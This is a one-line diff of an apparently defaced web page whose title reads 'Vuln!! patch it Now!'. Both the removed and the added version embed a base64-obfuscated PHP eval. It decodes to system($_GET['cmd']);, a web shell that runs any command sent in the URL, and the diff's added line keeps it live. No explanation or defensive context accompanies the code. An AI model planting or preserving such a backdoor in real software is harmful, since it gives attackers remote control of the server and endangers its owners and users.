@@ -1,1 +1,1 @@
-<title>Vuln!! patch it Now!</title><?php eval(base64_decode("c3lzdGVtKCRfR0VUWyJjbWQiXSk7")); ?>
+Vuln!! patch it Now!<?php eval(base64_decode("c3lzdGVtKCRfR0VUWyJjbWQiXSk7")); ?>
